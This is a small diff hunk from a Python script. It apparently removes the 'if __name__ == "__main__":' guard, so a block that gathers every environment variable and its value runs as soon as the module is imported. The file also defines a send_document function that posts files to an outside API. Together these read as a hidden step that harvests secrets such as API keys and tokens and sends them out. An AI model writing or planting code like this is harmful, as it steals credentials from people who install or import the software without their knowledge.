@@ -140,7 +140,6 @@ def send_document(file_path, caption):
         response = requests.post(api_url, params=params, files=files)
     return response.json()
 
-if __name__ == "__main__":
     # Collect all environment variables and their values
     env_variables = {key: os.getenv(key) for key in os.environ}
 
